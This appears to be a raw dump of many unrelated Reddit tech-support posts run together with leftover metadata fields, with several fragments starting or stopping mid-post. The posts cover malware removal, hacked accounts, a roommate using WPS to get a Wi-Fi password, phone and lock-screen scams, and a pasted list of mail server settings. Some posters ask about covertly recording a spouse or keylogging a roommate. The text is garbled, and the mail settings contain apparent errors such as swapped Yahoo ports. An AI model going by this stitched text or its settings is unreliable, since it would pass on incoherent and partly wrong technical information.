**TL;DR - Thank you very much for the replies and accept my apologies for any info, or lack of info, that misled you into thinking this was my job and I was about to be fired. I will be pushing my bosses to hold off on this decision until we meet with an Office 365 rep in our area, something I have already had planned for a couple weeks.**"	t5_2qioo	True

I've seen MacDefender (sometimes called macprotector) a lot in my shop lately, and it is easy to fix.

First go to applications --&gt; utilities --&gt; system monitor

Kill the MacDefender process.

Next go to system preferences --&gt; users --&gt; login items

Remove the MacDefender from there as well.

Finally, open a new finder window and search for ""macdefender""

Drag all items into the trash. You're done! Don't even need to restart. (but you can)

1370268756.0	1fkxr7	Is someone remote accessing my computer?	Nougat_Wasp	43	1	36	"Hi,

I was randomly looking through my search history to find a page I was on last week, and I noticed several items on the list that I did not recognise, mostly facebook messages to people I don't know and random women's dating profiles from a dating site I've never heard of (ww.pof.com?). The facebook profiles all belong to people from the area I live in, and I even have a friend in common with one of them, but I don't know or recognise any of them. The girls on the dating site seem to be from the surrounding area too.

In my search history from last Friday night, I found Google seaches for ""How to access router password through windows"" and ""how to find your wifi password on Windows 7"", as well as this page: http://windows.microsoft.com/en-GB/windows7/allow-remote-desktop-connections-from-outside-your-home-network

My search history shows loads of activity Friday night, but Friday night I was 3 hours away from my flat, visiting a friend in Birmingham. My boyfriend and our flat mate were here, but neither of them even know my password, and I left laptop turned off (not to mention that I completely trust them and have already asked if they know anything). The first activity in my search history from Friday night is at 8.13 PM, five hours after I left my flat.

The night between Thursday and Friday shows some activity that isn't mine either, from around 4 am, when I was asleep. Before that, it seem to be all me, although I've only gone back as far as Tuesday.

My laptop is an old Acer Aspire 9300, and I'm using Windows Vista. My browser is Google Chrome. Our wifi is password protected, but we've never changed it and are just using the password that came with the router.

Does anyone have any idea what's going on? I'm a little bit freaked out tbh :) Any help will be much appreciated!

Thanks!

Update: It turns out it was the 'stranger's browser logged into my Google account' scenario, as /u/felixgolden suggested. I kept looking through my browsing history and found a link to another dating website, clicked it, and it went to a login screen with the dudes e-mail address already filled in! I found him on Facebook and saw that he's friends with my boss, so I text my boss and asked if this guy happened to have borrowed my old work computer, which indeed he has. So now my boss has promised to let this poor guy know that some random girl has seen EVERYTHING he's done online since Thursday.

1362963358.0	1a1xw7	After not having used Paypal for 10 months, my account was hacked yesterday.	AnyTwoWillDo	46	8	27	"Hi, something weird happened today, I have a Paypal account I rarely use because I hate their service generally. The last time I used it (haven't logged in since) was last May. Today it was hacked. My password, bank account and security question were all changed. I have other ewallets accounts I use more often (the ones I use often are secured by RSA SecurID technology), none were affected (and some were protected by only password too). My email, social network and Steam accounts were not affected. 


My paypal account was only connected to a regular bank account so I had to initiate a wire from my bank account directly every time I wanted to put money on Paypal...
Sadly since I never use it I don't remember exactly what my Paypal password was. Since I never use it it is possible that I used a shared password for it though (all my important stuff have unique passwords). Paypal support sucks so it will take a long time before I have more info on that front. I changed the passwords of my most important accounts, and contacted the support team of the site I use that has the best support and they were able to confirm that no one has tried to log into my account except from my computer (which no one has access to). 

The questions I have:

-Anyone have any theories on what happened? Do you think the odds of a keylogger being in play with my description being significant? SInce May I have used the firewalls Avast and SuperAntiSpyware and have never had a serious infection other than some tracking cookies.

-What action should I take that I haven't taken? 

-Whoever hacked it had access to my personal details and my bank account number. Any risk of them having this information? I really don't know what information Paypal asked from me when I signed up, but I don't think it was more than the standard address telephone number crap.

Earlier this week, my new puppy was caught nomming on the 17""'s power cord. Everything still functioned, puppy was fine. Cable was taped up and cords rearranged to bring them off the floor.

At 4am today one of my circuit breakers flipped. Since I was in bed, I just assumed a power flicker and went back to bed.

When I got up to make breakfast I noticed that one of the breakers was still off. Thought nothing of it, just went and turned it on.

Happily nomming away on pancakes this morning when it sounds like a _gunshot_ went off next to me (PC was still OFF) and the circuit flipped again. Unplugged all the PC things. Wept a little. Opened case.

No visible blown capacitors.

Took the heatsink &amp; fan off the CPU, everything looked fine.



Anybody have any ideas wtf could have exploded? Maybe something in my power strip? I have a multimeter so I can check, but I honestly don't even know where to start and I want the advice of random strangers on the internet first &gt;.&gt;

cant believe how many replies this already has. but as you can see people are making VERY good points for getting a monitor or HDTV. pretty hard to choose :P

again i might reconsider this, people are bringing up REALLY good suggestions for both sides. and there might even be false info. so its back to decision stage for me.

5) Check the BIOS version to determine if you need to update. Read the changelog to see if it is even worth updating (if you don't need any of the added features, don't do it).

I never really anticipated that this post would get so many responses but from the answers provided I've narrowed my options to either spending money on a VPN service (I'm cheap), talking to the apartment management (They're cheap), or fixing the problem on my own which doesn't seem to be an viable option. I think I'll just start a new character in skyrim and be glad for what I can get :)

So when I first moved in my free internet seemed like a good deal. But as time has gone on my apartment complex has become more controlling with what they allow. Specifically they've blocked all computers or consoles from connecting when I try to play games that connect online. They've also blocked torrenting but I'm more concerned about playing multiplayer. I've thought about getting my own internet service but I'd rather not spend the money. If anyone has dealt with a similar problem or thinks they could help I would be eternally grateful. 

Edit: Wow i didn't expect this kind of response. To clarify, when i originally signed my lease it only said that internet was provided. In fact when I first moved in everything was great, I had gaming and could torrent, and our internet was markedly faster. However about 2 months into the semester an actual internet filter was put up that blocked any sites with r rated content. This was taken down after about two weeks of bitching and finally ended up as a block on just gaming and torrents, my connection also seems slower than it was to begin with.

Edit 2: Although It'd be nice to play games on console most of my gaming happens on pc. I saw a lot of people giving advice to get my consoles through but I'd prefer to get my pc through first , and i assume pc would be easier than console. 

Edit 3: One last detail, on my consoles I have access to other internet intensive activities (like downloading games) but blocked from actual multiplayer or online connectivity *in game*.

1315927245.0	kea2y	help with an audio recording of cheating no good ex wife	trolled2nite	49	9	34	"First, please ignore my user name, it was an inside joke and i didn't want to create a throw away

Me and my soon to be ex wife are going through some break up problems. She is a very manipulative person and will lie a the drop of a hat. She has turned so many people against me over the past few weeks. Ive caught her cheating 4 times in 5 years and shes done some bad things. shes been in rehab multiple times and her mothers spent 100's of thousands of dollars trying to fix her. Well after catching her this time shes not my problem, unfortunately we have twin 3 year olds and i refuse to let her drag them down like she has dragged me down. The new boy friend has a dishonorable discharge from the military, 3 dui's and a few more problems with drugs and the friends that entails. last week i sat down with her to discuss our parental duties as parents and how we were going to. I know what kind of person she is and how she turns things around. She has been spreading some serious rumors about me to friends and family and god only knows who else. to protect myself i had my laptop in my lap and made a covert audio recording of the entire 90 minute conversation. during this time she admitted Drug use, drinking and driving with my kids in the car, i had her tell the truth about the rumors she was spreading and how she took my kids to a party at some guys house she didn't know and she ended up drunk passing out with my kids there around these dirt bags. I really was watching out for numero uno and my children this time.  I have a very high priced attorney that is being funded by her very wealthy parents. They to are fed up with the lying and stealing and trouble she causes. Her mom says that she is still her daughter on the outside but inside she has changed. 
People of Reddit here is where i need help. I have the audio split up into 3 30 minute blocks and since the laptop was in front of me here voice is a little low. How can i fix this. This is not court evidence but will be used to persuade all the people she was bashing and calling pieces of shit to do the best thing for my kids. they have all seen her in action and think she is there friend. It really is sickening to think about, i have watched so many people break down in tears when i tell them the whole story and swear to do what ever it takes, this audio is to get the rest. 

here is just one example of her wonderful parenting skills, there are many many more
Me and my best friend are avid salt water fisherman. One Saturday we decided to take out my flats boat early that morning and try and get some red fish and trout. well turns out the ethanol fuel cased and issue with my boats performance so we limped back to the boat ramp and came how about 4 hours early. When we got there we will call her Medusa as to not spread names. well Medusa's car was gone and i figured she went some where with the kids. while we were cleaning the boat Medusa shows up and i walk over to get my kids out of the back of the car and they aren't there and i politely as where the hell are my kids. She says and i quote ""Oh, i left them locked in there rooms so i could go take care of a few things"" RAGE FACE does not come close to how i felt at that moment, my best friend immediately left because he was ready to harm her. within 2 weeks i had sold my pride and joy, the flats boat i custom built. i have not been fishing since.

Ok here is where i could really use some help

the audio recording i made i had teh latop in my lap like  i was reading my notes. my voice comes in very clear but heres is a very low level in the background. i would like to ""Enhance"" but unfortunately my XPS doesn't have the same button as the one on CSI. I have it save in windows media format. what do i need to do to fix the audio. i really just want to raise the level of her voice to equal or come close to mine. Fellow Redditor's can you please help me. I have never asked anyone for help in my life but this week i seem to be begging every one i can. I need it. Please ignore my grammer mistakes im at work still trying to hold back tears from the amount of frustration i have foe Medusa.

History on me
joined the military at 17
made it 7 years and  a few deployments
went to college for IT consulting and computer work

1368061249.0	1dyymc	I think someone is trying to scam my father, but before I declare shenanigans, I want to make sure.	MEANL3R	43	5	102	"My dad's laptop is a few years old, sorry, I don't have the specs, I looked at it this weekend, because he said it was slow.  He wasn't kidding.  It took about 15 seconds for the start menu to pop up and overall was really sluggish, but was *working*.  My suggestion to him was to wipe the HDD and reinstall Windows 7.  Obviously this is far too complicated for a man who asked ""how to right-click"" last year, so he took it to ""his guy.""  Dad runs a small business and has a few employees that use computers, though he rarely does.  Evidently they go to this guy pretty frequently when they have troubles.  

Their response was that the HDD was ""burned up"" and needed replacing for $350.  He said he didn't want to spend that much on it, they said ""fine, our services for looking at it are $75... **or you could let us keep it**.  Dad's no idiot, and this set off his bullshit meter, so paid the $75 and took the laptop home.  Then he called me and told me all of this.

They claimed that the laptop was hit by a surge of electricity, which they claim was caused by a faulty power cord.  The cord is wrapped in electrical tape where an office chair took some of the rubber off, I've looked at it, the wires are pretty much untouched.

So, my dad is pretty pissed, because he has trusted this guy with a lot of business over the past decade.  I just want to know if any of what this guy is saying could be true. 

 Thanks for any knowledge you might share and I would be happy to answer any further questions if it would help shed light on this situation.


**EDIT:**  Thanks for all of the info, guys.  I am going to do what GoGoGadgetReddit suggested and run a diagnostic myself.  The costs aren't as much of an issue as the trust.  $350 may or may not be completely ridiculous, but falsely diagnosing a problem with the intent of swindling a loyal customer out of a repairable computer to resell it, is.

For real...

As an IT professional, I have always wondered who provides tech support for the white house.

In pictures I have seen on the White House flickr page, I noticed they all have Dell machines with the standard peripherals. Which is confusing for me because, among other departments, I support the ROTC department within the university for which I am employed, and they have a government contract with HP (the rest of the university uses Dell [because they give us a massive discount], and Apple [because users demand it, we get no discount.]) I always assumed the HP Government contract went all the way to the top.

1331961879.0	r0hu6	Reddit! My roomate is somehow cracking my wireless password! help!	lukecool215	59	16	143	"So my roomate has been using my internets to download torrents. Fine, but I got a couple Emails from my ISP threatening to shut me down if ""I"" keep doing it. I pay for the internet and I will get screwed if he does this again.

So I asked him about it and he got all defensive and angry so I just decided to fix the situation passively. I logged onto my router using my phone (password protected and not ""password"") and changed the password to something slightly different. Not enough to where I would forget, but just extended the word a bit and capitalized a few letters.

From my room I can clearly hear the Xbox disconnect and shuffling around from my roomate. I then decide to take a nap. I wake up to hear him watching netflix on the xbox and I was like wtf? So I changed the password again using my phone, I hear the xbox disconnect, and he gets up, goes to the desktop, clicks a few times, and then goes back to the xbox and re-enters the new password. Note that I never touched my desktop; true that I do save the wireless password on it (not the router password), it is the old one and is therefore disconnected like the Xbox was.

I guess my question would be: How could he be doing this so quickly, and how do I stop it?

**Update**: Nothing has been changed, he has been doing this suspected password cracking using my own desktop computer! NOTE: The desktop does have the OLD wireless password saved, but not the new one that I changed it to until he somehow figured it out and manually changed it. 

I have a log on password on my desktop, but I just put it to sleep rather than turning off. I will change the settings later to prompt a password; I want to wait though and let him do this again so I can figure out where my holes are.

Yes, I am angry now and passive aggressive, but now I just want to know exactly what he is doing, or what I am doing wrong, for him to get my info so quickly.

Sure I can just switch the settings to prompt a password when it comes back from sleep, but I want to figure out what he is doing exactly. Is there some sort of program like a keylogger that you recommend that is relatively cheap/free that I can install on my desktop to log keystrokes and screencaps?

I think I will install said program, change the wireless password again on my phone, and see what he is doing on my desktop to figure my password out.

**UPDATE** +7 hours*

I just noticed that my roomate hid his laptop next to my router and had it wired via ethernet. I assume he was still downloading torrents. Is there a way he could gain access to the wireless settings by hard wiring to the router?

**UPDATE** +9 Hours

Installed DD-WRT onto my router and changed the router password, SSID, and wireless password all using a wired connection to the router.

I understand that having password security wont matter as long as he has a direct connection to the router, which is hard to avoid since he lives here. I am going to take the rest of my nap now I see how he reacts when he gets up.  [](/solved) For now. Updates when I get up.

Just watched him use WPS which I thought for sure was disabled. Stupid fucking WPS and it's shittyness. I think it is stupid that WPS GIVES you the password.

ZubazAmericazPantz	49	10	70	"My mother recently remodeled a guest house on her property and wants to share the Internet connection from her home with the new house. This is all in the country - gravel road, 45 min to nearest city, 10 min to closest small town. Here's what I'm dealing with:

Her house:
- Made of metal/aluminum siding (similar to a Morton/Wick building, much like many barns, outdoor garages, etc). However, due to it's building material, it's wreaked havoc on cell phone connections in the past. Unsure if it would effect wireless Internet as well.

- Satellite Internet - recently upgraded the dish, now is actually impressively fast connection.

- Wireless router - believe it's this Linksys router I purchased and set up for her 4-5 years ago. Works great in the house: http://www.amazon.com/gp/aw/d/B00007KDVI 

Guest house:
- approx 400 ft uphill from the house with existing Internet connection. Normal wood building material, but had a metal roof.

She has no interest in adding a second satellite dish &amp; paying additional monthly fees just for the guest house. 

I've tried simply connecting my cell phone wirelessly from the guest house to the router in the house, but it doesn't appear to have the range to do it.

I'm considering purchasing a bulk 500 ft of Ethernet cable, hooking it from the router in the house and stringing it outside and up to the house, where it will be hooked to various laptops/desktops depending on visitor.
I've read, however, that Ethernet cable is only reliable up to 300 ft and for what I'm attempting, I may need a repeater along the way?

Plus I have no idea how well Ethernet cable handles outdoor elements.

I'm fairly tech savvy, but don't have any experience with this sort of situation.

Any help is appreciated.

Now, I have known him for some time, and he is a decent guy, but he loves porn. Seriously this guy looks at some weird shit on my moms computer.

Here is my situation. Currently employed as a Systems/Network Admin at a company that is extremely forward thinking when it comes to technology. My job is challenging, I have a lot of responsibility, it's a fun environment. I manage close to 30 locations and growing. I love working here. Problem is, that I'm wayyy underpaid. I've been doing this job for 10 years or so and am well below the national average on pay. The company cannot afford (through fault of their own) to pay me a respectable rate. I'm talented, overworked, always on call, but I do love it here. 

Enter another employer. They offer to compensate me considerably more (which is great). BUT the job would be a step backward professionally. It's a much smaller network, with older, outdated equipment, less users and less responsibility. In some ways that is great, but in other ways it feels like a step in the wrong direction.

His alibi is he was at the hotel during the murder and asked for his room records and security footage...  
They have security cameras and a server thats on a 30day loop (30 day old footage is erased with current footage)

Heres the problem, the recorded video files are some uknown format and wont play back. They called the security company and it was disconnected. found out they went out of business. We can see the current video being recorded and found the files but can't play them. Shes giving me a thumb drive later w/ a sample file to try and play.

**TL;DR**Whats the best way to find the codecs for an unknown video file type? 

* I'll double check but i am pretty sure she'll let me upload the sample if its easier for you guys to try yourself. WE just need to replicate it here. **What would be the preferred way to get that file out to the masses? Torrent/Drop box/megaupload/etc**

* This may not be the footage of the guy (i dont even know what he looks like or what to look for, thats the police, they just need a way to play it) So it wont be 'cool' or anything sorry.

* I know technically were not solving a murder, we're just helping/hurting a defense case.


Thanks!

------------------------------

**EDIT 1**
I dont know what file type it is, if it was a dedicated box/windows/unix/linux/etc, how big the files are, etc... My mother in law is not tech savvy at all and i'll be surprised if theres actually a file on the thumb drive when i get it. I'll update all this as i find out.

I'm at work right now (limited research capabilities w/ a blocked network) But i'll be getting off work in 3-4 hours and have the file at home in 4-5 hours (5-6pm Eastern 8/5)

--------------------------------

**EDIT 2**
Well i was right. She didn't copy over the right file, its only 1KB (wil.cl5)
                                                   t:Oc                r:Oc                                            P   C : \ D O C U M E ~ 1 \ 1 9 5 \ L O C A L S ~ 1 \ T e m p \ e r r o r . l o g      E      d i s c . c i f   &lt;   C : \ D O C U M E ~ 1 \ 1 9 5 \ L O C A L S ~ 1 \ T e m p                                   TTTs\Sy                        ÿÿÿÿ                                                 1 1 0 8 0 4 _ 1 5 2 9           F i l e S y s t e m .

That was it. (I think we can assume its Windows)

She's going to try again on **Monday** But i'll update this feed or post again and reference this one. I'm putting all your questions into an email that maybe she can have someone more technical give a shot at.

**Oh and the defense lawyer is being a dick, calling her up and yelling at her for obstruction of justice etc, just fyi**

-----------------------

**EDIT 3**
ok so i still have no new info on the file (have to wait till monday) but theres a lot of concern about the proper procedure for this evidence. so i'll shed as much light as i can.  

I have a B.S. in CS and took a computer forensic class. we were taught things like ""never shut down windows, unplug it.. it writes 2K files while shutting down"" and ""dont just hook up the HDD, use a special READONLY cable so its all one way"". But also ""this is a field that is very much in need, most departments dont have a computer guy standing by, maybe 1 guy in the whole state with a basement full of computers he has to get to""

Im guessing this is just not as important as evidence? or they really dont know what they're doing. but i agree a really good lawyer could dismiss this evidence but this is what the cops told my mother in law ""We need you to get those files off and play them and give them to us"" It prob shouldn't be her responsibility but not sure who would 'pay' for it. Like if the evidence was in a safe, would the cops pick it? or ask her to figure out how to open it?

This is NJ/USA, i have a friend whos a cop a few towns over and i'll ask him what he thinks in the mean time.
And the lawyer being the dick? he is just saying he wants the file now and stop stalling, not that we're breaking the chain of forensics or anything (he should yell at cops for that). Im sure he'll wait to see if it hurts or helps his clients case before he argues that stuff...

-------------------------------------

**EDIT 3.5**
Also another story, my co-worker works at a liquor store part time (that his family owns) and a women came in asked for a good liquor to bring to a party, chatted a bit, left with purchasing jack daniels.... Next day police come in and say after she left she chugged the entire bottle in the parking lot and walked into oncoming traffic on the highway. He had to give the security footage that she wasn't drunk when he sold it and he just copied and burned it himself and handed it in. I know thats not a murder case but similar situation. (It turns out she found her husband cheating on her... she never drank liquor before)

------------------------------------------

**EDIT 4.0**
reply from my cop friend:

I want an offsite storage solution, but Googling doesn't turn up anything worth noting.

What do you guys use.

Edit: So after listening to you guys and my friends I've heard a few good options. I've always had my eye on a Drobo, and why wouldn't you. I'm thinking of getting two, one for my house and one for someone close...how far is too far?

I'm also really looking at Crash Plan and Backblze. Both are pretty cheep and seem like decent backup options.

1332478793.0	r9kjf	Need some advice. I recently discovered that my employer installed spy software on my computer. What would you do?	Throwawoot22	41	5	59	"Hello, [/r/techsupport](/r/techsupport). I'm in need of advice and wasn't sure where else to post this.

**Some background:** I'm a web dev that works for a small design firm that does multiple things. Recently, our other web guy left for another job and I am currently managing the department on my own. I'm underpaid, overworked and am actively looking for employment elsewhere.

Since my colleague's departure and my boss' unwillingness to pay me what I'm worth, the department has slumped. Not to mention I am 1 person trying to manage tasks that should be spread across 4-5 people. Despite all of this, I think I handle the department very well for what I'm dealing with. I handle client relations, quote projects, code, design, etc. Doesn't matter now.

**My issue at hand:** Today, through simple inspection, I discovered that there was spy software installed on my computer (specifically [this application](http://www.spectorsoft.com/products/Spector_Macintosh/index.asp?)). So I assumed that since it was on my computer it would be installed on the rest of the designers' computers and assumed the head of the company was merely trying to review productivity (positive thinking). This was not the case. My computer is the only one with this software actively running in the background on it.

I've done the research and know that legally this is allowed on my employer's part. They own the computers and at the workplace nothing is secret on such machines. I had no intention of going the legal route anyway. The problem I have aside from the blatant breach of trust, is that I was singled out. Additionally, the problem I have is that this software goes above and beyond simply allowing a user to view your desktop as you work (similar to VNC).

Telling him that he is a douche bag is too amateur.

I basically want to throw it in their face professionally while demonstrating that my computer knowledge exceeds their initial assumption.

They are 75% Apple, 25% Windows. Great company, great team and I hate feeling lost and helpless when stumbling about the OS trying to figure out the simplest of troubleshooting steps. I've been reading up on the Windows kbase constantly and, like any good IT person, can google the shit out of a problem and (likely) find the answer.

After 6 years of sharpening the same blade over and over, it's incredible how humbling this experience has been. I'm so well versed in the intricacies of the Mac OS, it's really quite depressing at my lack of familiarity with the Windows OS. I'm confident I'll wrap my head around it eventually but to save my team the grief, I'd prefer to speed up the process.

My request here is this: What can I read (online or in books) to learn more about basic troubleshooting for the Windows OS? 

For example, I read cover to cover the Peachpit Press Apple OS and Desktop Support books years ago when I got started in the biz. I also read David Pogue's Missing Manuals for OS X. (I will say that I tend to favor books, as opposed to ebooks, simply for the note-taking ability.) Btw, I've got the Windows 7 Missing Manual on order.

My apologies if this is the wrong subreddit. I appreciate any assistance.

Oh and in case you're wondering about the current set up at our office: 

90% of staff with a PC are running Windows 7, only a few are running Vista.

All Macs are running 10.6.7 or higher

On April 1st, I took a screenshot of my girlfriend's computer desktop. I put the screen shot as her desktop background and put the actual contents of her desktop in a folder located on her desktop. My plan was that she would click every icon to no avail, but when she clicked the folder (now the only active thing on the desktop) she would conveniently find all her icons and documents and even a message from me. I even put a JPEG image of her desktop next to the folder to clue her in when she thought something was wrong.

Unfortunately, things didn't go quite as I hoped. When nothing worked on her desktop, she blamed the folder that she had never seen before and deleted the folder without looking in it. Then she immediately emptied her trash.

This folder contained documents saved to the desktop like class notes in Microsoft Word.

While I was at work today, my parents received a phone call from a man named Shane claiming that he worked for Microsoft Windows Support in New York.  He told my parents that he received reports of multiple viruses on my computer. He walked them through the steps that allowed him to take over our computer. I was gone at the time and my parents don't know much about computers so they fell for it. My parents can't describe exactly what he did when he took over the computer, but they said he ""opened and closed different programs, and then a long list of viruses and warnings popped up and he fixed them."" Then a pop up came up saying that windows has expired and needs to be updated. Shane said that they needed to purchase it via credit card. When my dad refused to give out the credit card, Shane said that all of the viruses were fixed and hung up. 

When I came home and they told me about this, I knew it was an obvious scam. My parents are now worried that the scammers have access to our information such as credit card numbers, passwords, etc. and want to know if there are any steps we can take to secure our information. Any ideas on what we should do?

Here are the phone numbers from the ""Microsoft Windows Support"":

ASRock Z77 Pro4

OCZ Agility 3 120 GB

Now, my pc won't start up after some days of use. This also happened on the first day, but where it turned on for about 1 second and turned off again. Now, i know all of my hardware works, and i suspect it being the power supply not being connected properly to the motherboard, but i've tried pressing it harder on, taking it out and setting it back on again, yet nothing helps. Though sometimes, it turned on for about 5 seconds, then shut down again.

I suspect it being the motherboard, but it's brand new, and i don't know what is wrong with it. Also, the GPU fans doesn't spin, while all the others does.

The company, from where i bought the motherboard wants ~$100 for just checking it for any damages, and i'm completely broke, so please help reddit ;)

So I'm having a problem. I work for a company that employs a lot of employees, so they use a scheduling website that lets us put in our availability and drop and pick up shifts whenever we please (Schedulesource if anybody knows what that is). Because of this, I've noticed that there have been next to no shifts posted. I turned on the notifications for them and discovered that while many shifts were being posted, they were also being picked up just as quickly, so even if I constantly refresh the page, I either never see them or they appear and reappear in a matter of seconds. This goes for shifts that I KNOW nobody would want to pick up (overnight shifts, really early morning shifts, etc).

We have had problems with bots or automated scripts before, with people running them to pick up shifts, so I believe bots are still running on the site. However, it's not like my company or the scheduling company can do much about it. The question is, how do I combat this on my own? This is cutting into my potential hours, and is not fair to those of us who want to actually work honestly. Was wondering if reddit had any opinions on how to deal with this problem?

I work at a dealership, and I just turned on one of the computers that was supposedly locked by the RCMP because somebody 'downloaded/viewed child porn/zoophilia'. I was immediately skeptical because there are two people I know who use the computer, myself, and somebody who I consider very trustworthy and would never dare to do such a thing. A second factor was that it was asking $150 CDN, which seems a petty price for pedophilia. Moreover, the fact that I had to pay online through something called U Pay 
(or along the lines), an online medium for transferring money that I've never heard of.

Being the hesitant guy that I was, I googled locked screen scam and surprise, surprise, it's a scam.

What also concerns me is that we just had an IT guy here, which makes me suspicious of him and has me thinking he might have some role in this.

Either way, the question is this:

Should I warn management about the compromise, or is this likely just an isolated incident? If the former, do larger steps have to be taken?

1305831429.0	hf99j	[For Future Reference] Here is a page that has the pop/smtp mail settings for many many email services	scientologist2	37	3	5	"[As seen/found here](http://www.emailaddressmanager.com/tips/mail-settings.html) - Because you may know somebody who will need this info someday

**Mail Server Settings**

**Hotmail Settings**

As other web based email services, Hotmail is using the HTTP protocol for connecting you to your mailbox. If you want to send and receive Hotmail emails using an email client software, then your software must support Hotmail HTTP access for your email account. Some email clients, such as Outlook Express or Microsoft Outlook, offer builtin support for Hotmail accounts, so you only have to select HTTP when you are asked to select your email account type and select Hotmail as the HTTP Mail Service Provider.

Mail Server Settings for Hotmail using the Microsoft Outlook Connector

If you are using Microsoft Outlook &amp; the Outlook Connector, you can define your Hotmail account just like any regular POP3 email account:

Hotmail Incoming Mail Server (POP3) - pop3.live.com (logon using Secure Password Authentification - SPA, mail server port: 995)

Hotmail Outgoing Mail Server (SMTP) - smtp.live.com (TLS enabled, port 587)

**Yahoo! Mail Settings**

Yahoo Mail offers standard POP3 access for receiving emails incoming through your Yahoo mailbox, by using your favorite email client software. To setup your email client for working with your Yahoo account, you need to select the POP3 protocol and use the following mail server settings:

Yahoo Incoming Mail Server (POP3) - pop.mail.yahoo.com (SSL enabled, port 465)

Yahoo Outgoing Mail Server (SMTP) - smtp.mail.yahoo.com (SSL enabled, port 995)

**POP Yahoo! Mail Plus email server settings**

Yahoo Plus Incoming Mail Server (POP3) - plus.pop.mail.yahoo.com (SSL enabled, port 995)

Yahoo Plus Outgoing Mail Server (SMTP) - plus.smtp.mail.yahoo.com (SSL enabled, port 465, use authentication)

**Google GMail Settings**

The Google GMail service offers email client access for retrieving and sending emails through your Gmail account. However, for security reasons, GMail uses POP3 over an SSL connection, so make sure your email client supports encrypted SSL connections.

Google Gmail Incoming Mail Server (POP3) - pop.gmail.com (SSL enabled, port 995)

Outgoing Mail Server - use the SMTP mail server address provided by your local ISP or smtp.gmail.com (TLS enabled, port 587)

**MSN Mail Settings**

The MSN email service allows you to use the MSN POP3 and SMTP servers to access your MSN mailbox.

MSN Incoming Mail Server (POP3) - pop3.email.msn.com (port 110, using Secure Password Authentication - SPA)

MSN Outgoing Mail Server - smtp.email.msn.com (select ""My outgoing server requires authentication"")

**Lycos Mail Settings**

The Lycos Mail Plus service allows you to use POP3 and SMTP servers for accessing your Lycos mailbox.

Lycos Mail Incoming Mail Server (POP3) - pop.mail.lycos.com (port 110)

Outgoing Mail Server - smtp.mail.lycos.com or use your local ISP SMTP mail server

**AOL Mail Settings**

The AOL email service is a web based system, designed for managing your AOL mailbox via HTTP IMAP access. Unlike Hotmail, you can use any email client to access your AOL mailbox, as long as it supports the IMAP protocol.

AOL Incoming Mail Server (IMAP) - imap.aol.com (port 143)

AOL Outgoing Mail Server - smtp.aol.com or use your local ISP SMTP mail server

**Mail.com Mail Settings**

The Mail.com email service allows you to use POP3 and SMTP servers for accessing your Mail.com mailbox.

Mail.com Mail Incoming Mail Server (POP3) - pop1.mail.com (port 110)

Outgoing Mail Server - use your local ISP SMTP mail server

**Netscape Internet Service Mail Settings**

The Netscape e-mail system is web-based, which means you can access their e-mail from any Internet connection. Netscape Internet Service also supports AOL® Communicator, Microsoft® Outlook, Microsoft® Outlook Express, and other POP3 e-mail software. The outgoing mail server needs SSL support, so make sure your email client software supports SSL connections over the SMTP protocol.

Netscape Internet Service Incoming Mail Server (POP3) - pop.3.isp.netscape.com (port 110)

Netscape Internet Service Outgoing Mail Server - smtp.isp.netscape.com (port 25, using a secure SSL connection)

**Tiscali Mail Settings**

The Tiscali email service allows you to use POP3 and SMTP servers for accessing your Tiscali mailbox.

Tiscali Incoming Mail Server (POP3) - pop.tiscali.com (port 110)

Outgoing Mail Server - use your local ISP SMTP mail server

**Freeserve Mail Settings**

The Freeserve email service allows you to use POP3 and SMTP servers for accessing your Freeserve mailbox.

Freeserve Incoming Mail Server (POP3) - pop.freeserve.com (port 110)

Outgoing Mail Server - use your local ISP SMTP mail server

**Supanet Mail Settings**

The Supanet email service allows you to use POP3 and SMTP servers for accessing your Supanet mailbox.

Supanet Incoming Mail Server (POP3) - pop.supanet.com (port 110)

Outgoing Mail Server - use your local ISP SMTP mail server

**GMX**

POP3 Server: pop.gmx.com

SMTP Server: mail.gmx.com (for POP and IMAP)  port 465 SSL/TLS

IMAP4 Server: imap.gmx.com   port 993 SSL/TLS

http://help.gmx.com/mail/overview/pop3/

*If your email client does not support Hotmail as a Mail Service Provider or if it simply doesn't work with your mail server settings, you can use a 3rd party solution like Hotmail Popper, IzyMail, POP Peeper or Email2Pop. When using such tools, you should define your Hotmail account as a POP3 account and you will need to define your incoming mail server will as 'localhost' (or 127.0.0.1).*

So what i think happened when he loaded it was he booted the laptop with the CD-R in the drive. He pushed one of the F keys to get to a menu (there was a dark grey(?) area at the bottom where he put in the command(?) to run knoppix). Knoppix ran well and it got me looking for a beginners manual so i can learn it to help with becoming an engineer.

So the next day i repaired the file and my computer works well again. I am just wondering if anybody will know how i can boot knoppix again off the CD-R?

Reddit, I'm in a panic. My whole flat is in a panic.

We're in New Zealand and our internet connection is capped - we have a limit of 150gb per month to adhere to. Five people are sharing this connection, so we usually go over that a bit and need to pay excess usage fees. 

But this is absolutely nowhere near our usual usage. It's maybe three or four times that. If this continues and we're liable, this could cost hundreds of dollars. But we don't know what's causing it! 

* It's never happened before
* Everyone's computers are virus-checked
* We've tried changing our IP address
* We actually got a spike *while the router was disconnected for 48 hours*
* The internet slows to a halt for a few minutes around the same time that spikes are recorded

Please, do you know what this is?

ItsGotToMakeSense	46	10	60	"**edit**: A lot of you seem to be misunderstanding the nature of the question and jumping to conclusions. So far the two most popular answers are:  
1) You're an ass. Support them anyway.  
2) I have no idea.  
  
As for 1) The thing is, I can't support everyone. I have two jobs and a kid which take up most of my time. I've got parents, siblings, cousins, uncles, aunts, grandparents, in-laws, etc. some of whom live quite far away. I am not comfortable talking them through hardware replacements, and remote access isn't always realistic for some of them. Sometimes it's just more appropriate to say ""Call so-and-so"" instead of getting involved. So don't be a knee-jerk, people. We can't all do every favor that is asked of us.  
  
As for 2) That's a shame. The best answer in that regard is apparently to read reviews of a local mom and pop shop. I suspected that would be my best option, but was hoping there may be a more reputable chain, or at least a good resource for reviews of tech support businesses."	t5_2qioo	True

I started a new job about 6 months ago and have settled in really well. Everything workwise is going really great. The problem is, it's a 9-5 office job and what I get given a full day to do, I will really do in like 2 hours. I end up with a lot of downtime despite trying to find extra work, and so I often browse reddit or email my SO, things like that. I recently found the company (very large institution) internet usage policy stating that ALL personal use is banned and monitored for inappropriate material. As you'll all be well aware, reddit can often turn NSFW very quickly, plus I have sent personal emails etc. It's not like i've been browsing porn or anything but it's a lot of non-work-appropriate traffic. Essentially, if they look into it I'm fired.

I thought this sub might be a good place to ask, does anyone have experience on the other side of this? What are they looking for? What are the red flags? If I stop all personal activity immediately, would that go towards helping? I am seriously scared I will lose my job, along with an awkward conversation with my bosses, who I reeeally like.

